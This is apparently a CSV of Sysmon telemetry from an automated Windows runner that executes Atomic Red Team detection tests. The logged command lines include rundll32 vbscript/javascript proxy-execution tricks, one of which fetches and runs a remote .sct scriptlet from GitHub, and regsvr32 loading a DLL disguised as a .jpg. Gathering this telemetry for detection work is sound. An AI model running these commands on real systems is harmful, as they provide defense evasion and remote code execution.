"12/17/2025 8:10:22 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:10:22.575
ProcessGuid: {f995aebf-656e-6942-1d07-000000000e00}
ProcessId: 4276
Image: C:\Windows\System32\wbem\WmiPrvSE.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: WMI Provider Host
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Wmiprvse.exe
CommandLine: C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\NETWORK SERVICE
LogonGuid: {f995aebf-59d9-6942-e403-000000000000}
LogonId: 0x3E4
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA256=240C985EED57DEE92E0415F86CE67439E24179EA3281D57A395A90E92F6844D5
ParentProcessGuid: {f995aebf-59d8-6942-0e00-000000000e00}
ParentProcessId: 696
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k DcomLaunch -p
ParentUser: NT AUTHORITY\SYSTEM"
"12/17/2025 8:09:05 AM","12","Registry object added or deleted:
RuleName: T1547.001,RunKey
EventType: DeleteValue
UtcTime: 2025-12-17 08:09:05.816
ProcessGuid: {f995aebf-59f5-6942-d500-000000000e00}
ProcessId: 7596
Image: C:\Windows\system32\sihost.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500\SOFTWARE\Microsoft\Windows\CurrentVersion\RunNotification\StartupTNotiT1218.005.hta
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:08:22 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:08:22.661
ProcessGuid: {f995aebf-64f6-6942-1207-000000000e00}
ProcessId: 10188
Image: C:\Windows\System32\rundll32.exe
ImageLoaded: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25110.5-0\MpClient.dll
FileVersion: 4.18.25110.5 (4a6978a838df7287d907bb2ee8a2eeb2373b186e)
Description: Client Interface
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: mpclient.dll
Hashes: SHA256=F1CA293E6D05A500EB026529A27948B01B6467D0E9C20C6049101C2B2829B96A
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:08:22 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:08:22.657
ProcessGuid: {f995aebf-64f6-6942-1207-000000000e00}
ProcessId: 10188
Image: C:\Windows\System32\rundll32.exe
ImageLoaded: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25110.5-0\MpOAV.dll
FileVersion: 4.18.25110.5 (4a6978a838df7287d907bb2ee8a2eeb2373b186e)
Description: IOfficeAntiVirus Module
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: MpOAV.dll
Hashes: SHA256=0EF8AE9CC8E3722C0AE09B55531BBA2F2A3422CCF4A1BB9B37ABDB4808AAC232
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:08:22 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:08:22.584
ProcessGuid: {f995aebf-64f6-6942-1207-000000000e00}
ProcessId: 10188
Image: C:\Windows\System32\rundll32.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows host process (Rundll32)
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: RUNDLL32.EXE
CommandLine: rundll32  vbscript:""\..\mshtml,#135 ""+String(CreateObject(""WScript.Shell"").Run(""calc.exe""),0)
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=2F2321D2A3EEEC2CDD7D921645C121BED75872435926EE97F3D53E7EE7662BF0
ParentProcessGuid: {f995aebf-64f6-6942-1007-000000000e00}
ParentProcessId: 6012
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c rundll32 vbscript:""\..\mshtml,#135 ""+String(CreateObject(""WScript.Shell"").Run(""calc.exe""),0)
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:08:21 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 08:08:21.971
ProcessGuid: {f995aebf-64f5-6942-0f07-000000000e00}
ProcessId: 7752
Image: C:\Windows\System32\wbem\WmiPrvSE.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\NETWORK SERVICE"
"12/17/2025 8:08:21 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:08:21.927
ProcessGuid: {f995aebf-64f5-6942-0f07-000000000e00}
ProcessId: 7752
Image: C:\Windows\System32\wbem\WmiPrvSE.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: WMI Provider Host
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Wmiprvse.exe
CommandLine: C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\NETWORK SERVICE
LogonGuid: {f995aebf-59d9-6942-e403-000000000000}
LogonId: 0x3E4
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA256=240C985EED57DEE92E0415F86CE67439E24179EA3281D57A395A90E92F6844D5
ParentProcessGuid: {f995aebf-59d8-6942-0e00-000000000e00}
ParentProcessId: 696
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k DcomLaunch -p
ParentUser: NT AUTHORITY\SYSTEM"
"12/17/2025 8:06:23 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:06:21.451
ProcessGuid: {f995aebf-647d-6942-0007-000000000e00}
ProcessId: 2352
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.111.133;::ffff:185.199.110.133;::ffff:185.199.108.133;::ffff:185.199.109.133;
Image: C:\Windows\System32\rundll32.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:06:23 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 08:06:21.454
ProcessGuid: {f995aebf-647d-6942-0007-000000000e00}
ProcessId: 2352
Image: C:\Windows\System32\rundll32.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.103
SourceHostname: runnervm8j6r3.5cxh0c1awo1ufoksjxtfocoz2d.ex.internal.cloudapp.net
SourcePort: 52293
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.111.133
DestinationHostname: cdn-185-199-111-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 8:06:22 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:06:22.020
ProcessGuid: {f995aebf-647d-6942-0407-000000000e00}
ProcessId: 1696
Image: C:\Windows\System32\rundll32.exe
ImageLoaded: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25110.5-0\MpClient.dll
FileVersion: 4.18.25110.5 (4a6978a838df7287d907bb2ee8a2eeb2373b186e)
Description: Client Interface
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: mpclient.dll
Hashes: SHA256=F1CA293E6D05A500EB026529A27948B01B6467D0E9C20C6049101C2B2829B96A
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:06:21 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:06:21.995
ProcessGuid: {f995aebf-647d-6942-0407-000000000e00}
ProcessId: 1696
Image: C:\Windows\System32\rundll32.exe
ImageLoaded: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25110.5-0\MpOAV.dll
FileVersion: 4.18.25110.5 (4a6978a838df7287d907bb2ee8a2eeb2373b186e)
Description: IOfficeAntiVirus Module
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: MpOAV.dll
Hashes: SHA256=0EF8AE9CC8E3722C0AE09B55531BBA2F2A3422CCF4A1BB9B37ABDB4808AAC232
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:06:21 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:06:21.926
ProcessGuid: {f995aebf-647d-6942-0407-000000000e00}
ProcessId: 1696
Image: C:\Windows\System32\rundll32.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows host process (Rundll32)
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: RUNDLL32.EXE
CommandLine: rundll32  vbscript:""\..\mshtml,RunHTMLApplication ""+String(CreateObject(""WScript.Shell"").Run(""calc.exe""),0)
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=2F2321D2A3EEEC2CDD7D921645C121BED75872435926EE97F3D53E7EE7662BF0
ParentProcessGuid: {f995aebf-647d-6942-0207-000000000e00}
ParentProcessId: 8084
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c rundll32 vbscript:""\..\mshtml,RunHTMLApplication ""+String(CreateObject(""WScript.Shell"").Run(""calc.exe""),0)
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:06:21 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:06:21.535
ProcessGuid: {f995aebf-647d-6942-0007-000000000e00}
ProcessId: 2352
Image: C:\Windows\System32\rundll32.exe
ImageLoaded: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25110.5-0\MpClient.dll
FileVersion: 4.18.25110.5 (4a6978a838df7287d907bb2ee8a2eeb2373b186e)
Description: Client Interface
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: mpclient.dll
Hashes: SHA256=F1CA293E6D05A500EB026529A27948B01B6467D0E9C20C6049101C2B2829B96A
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:06:21 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:06:21.463
ProcessGuid: {f995aebf-647d-6942-0007-000000000e00}
ProcessId: 2352
Image: C:\Windows\system32\rundll32.exe
TargetObject: HKLM\System\CurrentControlSet\Control\SecurityProviders\SCHANNEL
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:06:21 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:06:21.406
ProcessGuid: {f995aebf-647d-6942-0007-000000000e00}
ProcessId: 2352
Image: C:\Windows\System32\rundll32.exe
ImageLoaded: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25110.5-0\MpOAV.dll
FileVersion: 4.18.25110.5 (4a6978a838df7287d907bb2ee8a2eeb2373b186e)
Description: IOfficeAntiVirus Module
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: MpOAV.dll
Hashes: SHA256=0EF8AE9CC8E3722C0AE09B55531BBA2F2A3422CCF4A1BB9B37ABDB4808AAC232
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:06:21 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:06:21.334
ProcessGuid: {f995aebf-647d-6942-0007-000000000e00}
ProcessId: 2352
Image: C:\Windows\System32\rundll32.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows host process (Rundll32)
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: RUNDLL32.EXE
CommandLine: rundll32.exe  javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.011/src/T1218.011.sct"").Exec();window.close();
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=2F2321D2A3EEEC2CDD7D921645C121BED75872435926EE97F3D53E7EE7662BF0
ParentProcessGuid: {f995aebf-647d-6942-fe06-000000000e00}
ParentProcessId: 6328
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.011/src/T1218.011.sct"").Exec();window.close();
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:06:21 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:06:21.042
ProcessGuid: {f995aebf-647d-6942-fd06-000000000e00}
ProcessId: 7724
Image: C:\Windows\System32\whoami.exe
FileVersion: 10.0.26100.1882 (WinBuild.160101.0800)
Description: whoami - displays logged on user information
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: whoami.exe
CommandLine: ""C:\Windows\system32\whoami.exe""
CurrentDirectory: D:\a\sysmon\sysmon\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=23240EF9F8B0A9A324110B1C2331DE31DC1B0E08F5359CB707E51A939AF56CD3
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:06:21 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:06:21.023
ProcessGuid: {f995aebf-647d-6942-fc06-000000000e00}
ProcessId: 1772
Image: C:\Windows\System32\HOSTNAME.EXE
FileVersion: 10.0.26100.2161 (WinBuild.160101.0800)
Description: Hostname APP
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: hostname.exe
CommandLine: ""C:\Windows\system32\HOSTNAME.EXE""
CurrentDirectory: D:\a\sysmon\sysmon\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=8FF283FB7A282A9B2B30235016669DFE795665BCBB254FD17AC31FA9308D89D9
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:06:19 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:06:19.085
ProcessGuid: {f995aebf-647b-6942-f906-000000000e00}
ProcessId: 5980
Image: C:\Windows\System32\regsvr32.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Microsoft(C) Register Server
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: REGSVR32.EXE
CommandLine: C:\Windows\system32\regsvr32.exe  /U /s C:\Users\RUNNER~1\AppData\Local\Temp\shell32.jpg
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=8D1F34DB7D8297E71184CA0EEDD1A291C3930BD3214BC1CCCFA102891AD9DA52
ParentProcessGuid: {f995aebf-647b-6942-f706-000000000e00}
ParentProcessId: 6900
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c C:\Windows\system32\regsvr32.exe /U /s %temp%\shell32.jpg
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:06:18 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:06:18.182
ProcessGuid: {f995aebf-647a-6942-f006-000000000e00}
ProcessId: 6576
Image: C:\Windows\System32\whoami.exe
FileVersion: 10.0.26100.1882 (WinBuild.160101.0800)
Description: whoami - displays logged on user information
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: whoami.exe
CommandLine: ""C:\Windows\system32\whoami.exe""
CurrentDirectory: D:\a\sysmon\sysmon\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=23240EF9F8B0A9A324110B1C2331DE31DC1B0E08F5359CB707E51A939AF56CD3
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:06:18 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:06:18.164
ProcessGuid: {f995aebf-647a-6942-ef06-000000000e00}
ProcessId: 6988
Image: C:\Windows\System32\HOSTNAME.EXE
FileVersion: 10.0.26100.2161 (WinBuild.160101.0800)
Description: Hostname APP
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: hostname.exe
CommandLine: ""C:\Windows\system32\HOSTNAME.EXE""
CurrentDirectory: D:\a\sysmon\sysmon\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=8FF283FB7A282A9B2B30235016669DFE795665BCBB254FD17AC31FA9308D89D9
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:06:13 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 08:06:13.093
ProcessGuid: {f995aebf-6475-6942-ee06-000000000e00}
ProcessId: 9000
Image: C:\Windows\System32\wbem\WmiPrvSE.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\NETWORK SERVICE"
"12/17/2025 8:06:13 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:06:13.052
ProcessGuid: {f995aebf-6475-6942-ee06-000000000e00}
ProcessId: 9000
Image: C:\Windows\System32\wbem\WmiPrvSE.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: WMI Provider Host
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Wmiprvse.exe
CommandLine: C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\NETWORK SERVICE
LogonGuid: {f995aebf-59d9-6942-e403-000000000000}
LogonId: 0x3E4
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA256=240C985EED57DEE92E0415F86CE67439E24179EA3281D57A395A90E92F6844D5
ParentProcessGuid: {f995aebf-59d8-6942-0e00-000000000e00}
ParentProcessId: 696
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k DcomLaunch -p
ParentUser: NT AUTHORITY\SYSTEM"
"12/17/2025 8:04:30 AM","12","Registry object added or deleted:
RuleName: T1547.001,RunKey
EventType: DeleteValue
UtcTime: 2025-12-17 08:04:30.526
ProcessGuid: {f995aebf-59f5-6942-d500-000000000e00}
ProcessId: 7596
Image: C:\Windows\system32\sihost.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500\SOFTWARE\Microsoft\Windows\CurrentVersion\RunNotification\StartupTNoticalc
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:13 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:04:11.064
ProcessGuid: {f995aebf-63fa-6942-d306-000000000e00}
ProcessId: 752
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.111.133;::ffff:185.199.110.133;::ffff:185.199.108.133;::ffff:185.199.109.133;
Image: C:\Windows\System32\regsvr32.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:13 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:04:13.164
ProcessGuid: {f995aebf-63fd-6942-e106-000000000e00}
ProcessId: 10092
Image: C:\Windows\SysWOW64\regsvr32.exe
ImageLoaded: C:\Windows\Microsoft.NET\Framework\v4.0.30319\clrjit.dll
FileVersion: 4.8.9310.0 built by: NET481REL1LAST_C
Description: Microsoft .NET Runtime Just-In-Time Compiler
Product: Microsoft? .NET Framework
Company: Microsoft Corporation
OriginalFileName: clrjit.dll
Hashes: SHA256=7505C375647F4E64ADA627089217984DE698E9F5D2B2EE33AF4F8674644F1597
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:13 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:04:13.125
ProcessGuid: {f995aebf-63fd-6942-e106-000000000e00}
ProcessId: 10092
Image: C:\Windows\SysWOW64\regsvr32.exe
ImageLoaded: C:\Windows\Microsoft.NET\Framework\v4.0.30319\clr.dll
FileVersion: 4.8.9310.0 built by: NET481REL1LAST_C
Description: Microsoft .NET Runtime Common Language Runtime - WorkStation
Product: Microsoft? .NET Framework
Company: Microsoft Corporation
OriginalFileName: clr.dll
Hashes: SHA256=3E10AA220D63BF5A29D7CA8423856D8993D469D9D74382309205505AEADFD0F8
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:13 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:04:13.085
ProcessGuid: {f995aebf-63fd-6942-e106-000000000e00}
ProcessId: 10092
Image: C:\Windows\SysWOW64\regsvr32.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Microsoft(C) Register Server
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: REGSVR32.EXE
CommandLine:   /s /i ""C:\AtomicRedTeam\atomics\T1218.010\bin\AllTheThingsx86.dll""
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=097108607177A9282D10CD4808221B171B729AFBADB1EBA3C99139348AC8295F
ParentProcessGuid: {f995aebf-63fd-6942-e006-000000000e00}
ParentProcessId: 8204
ParentImage: C:\Windows\System32\regsvr32.exe
ParentCommandLine: C:\Windows\system32\regsvr32.exe  /s /i ""C:\AtomicRedTeam\atomics\T1218.010\bin\AllTheThingsx86.dll""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:13 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:04:13.059
ProcessGuid: {f995aebf-63fd-6942-e006-000000000e00}
ProcessId: 8204
Image: C:\Windows\System32\regsvr32.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Microsoft(C) Register Server
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: REGSVR32.EXE
CommandLine: C:\Windows\system32\regsvr32.exe  /s /i ""C:\AtomicRedTeam\atomics\T1218.010\bin\AllTheThingsx86.dll""
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=8D1F34DB7D8297E71184CA0EEDD1A291C3930BD3214BC1CCCFA102891AD9DA52
ParentProcessGuid: {f995aebf-63fd-6942-de06-000000000e00}
ParentProcessId: 8992
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c C:\Windows\system32\regsvr32.exe /s /i ""C:\AtomicRedTeam\atomics\T1218.010\bin\AllTheThingsx86.dll""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:12 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 08:04:11.068
ProcessGuid: {f995aebf-63fa-6942-d306-000000000e00}
ProcessId: 752
Image: C:\Windows\System32\regsvr32.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.103
SourceHostname: runnervm8j6r3.5cxh0c1awo1ufoksjxtfocoz2d.ex.internal.cloudapp.net
SourcePort: 52242
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.111.133
DestinationHostname: cdn-185-199-111-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 8:04:12 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:04:12.769
ProcessGuid: {f995aebf-63fc-6942-dc06-000000000e00}
ProcessId: 3752
Image: C:\Windows\System32\regsvr32.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Microsoft(C) Register Server
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: REGSVR32.EXE
CommandLine: C:\Windows\system32\regsvr32.exe  /s C:\Users\RUNNER~1\AppData\Local\Temp\shell32.jpg
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=8D1F34DB7D8297E71184CA0EEDD1A291C3930BD3214BC1CCCFA102891AD9DA52
ParentProcessGuid: {f995aebf-63fc-6942-da06-000000000e00}
ParentProcessId: 6472
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c C:\Windows\system32\regsvr32.exe /s %temp%\shell32.jpg
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:11 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:04:11.617
ProcessGuid: {f995aebf-63fb-6942-d806-000000000e00}
ProcessId: 9484
Image: C:\Windows\SysWOW64\regsvr32.exe
ImageLoaded: C:\Windows\Microsoft.NET\Framework\v4.0.30319\clrjit.dll
FileVersion: 4.8.9310.0 built by: NET481REL1LAST_C
Description: Microsoft .NET Runtime Just-In-Time Compiler
Product: Microsoft? .NET Framework
Company: Microsoft Corporation
OriginalFileName: clrjit.dll
Hashes: SHA256=7505C375647F4E64ADA627089217984DE698E9F5D2B2EE33AF4F8674644F1597
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:11 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:04:11.583
ProcessGuid: {f995aebf-63fb-6942-d806-000000000e00}
ProcessId: 9484
Image: C:\Windows\SysWOW64\regsvr32.exe
ImageLoaded: C:\Windows\Microsoft.NET\Framework\v4.0.30319\clr.dll
FileVersion: 4.8.9310.0 built by: NET481REL1LAST_C
Description: Microsoft .NET Runtime Common Language Runtime - WorkStation
Product: Microsoft? .NET Framework
Company: Microsoft Corporation
OriginalFileName: clr.dll
Hashes: SHA256=3E10AA220D63BF5A29D7CA8423856D8993D469D9D74382309205505AEADFD0F8
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:11 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:04:11.484
ProcessGuid: {f995aebf-63fb-6942-d806-000000000e00}
ProcessId: 9484
Image: C:\Windows\SysWOW64\regsvr32.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Microsoft(C) Register Server
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: REGSVR32.EXE
CommandLine: C:\Windows\syswow64\regsvr32.exe  /s C:\AtomicRedTeam\atomics\T1218.010\bin\AllTheThingsx86.dll
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=097108607177A9282D10CD4808221B171B729AFBADB1EBA3C99139348AC8295F
